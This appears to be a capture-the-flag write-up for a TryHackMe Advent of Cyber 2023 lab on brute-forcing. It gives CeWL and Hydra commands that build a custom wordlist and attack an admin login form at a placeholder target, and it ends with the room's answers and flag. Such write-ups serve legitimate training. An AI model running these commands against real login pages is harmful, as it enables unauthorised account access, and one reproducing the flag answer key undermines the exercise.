# Advent of Cyber 2023 - Day 4: Brute-Forcing

{% embed url="https://tryhackme.com/room/adventofcyber2023" %}

## Background
Target-specific wordlist creation using **CeWL** (Custom Word List generator) to spider website content and crack non-standard passwords.

## Walkthrough
1. Spider the target company website to extract custom vocabulary:
   ```bash
   cewl http://TARGET_IP/ -d 2 -m 5 -w custom_wordlist.txt
   ```
2. Feed the generated wordlist into Hydra or Wfuzz against the portal login:
   ```bash
   hydra -l administrator -P custom_wordlist.txt TARGET_IP http-post-form "/admin_login:user=^USER^&pass=^PASS^:F=Login failed"
   ```
3. Authenticate to the dashboard to extract the administration flag.

## 🏁 Questions & Answers

| Question | Answer |
|---|---|
| Tool used to spider web text into custom wordlists? | `cewl` |
| Portal access flag | `THM{CUSTOM_WORDLISTS_WIN}` |
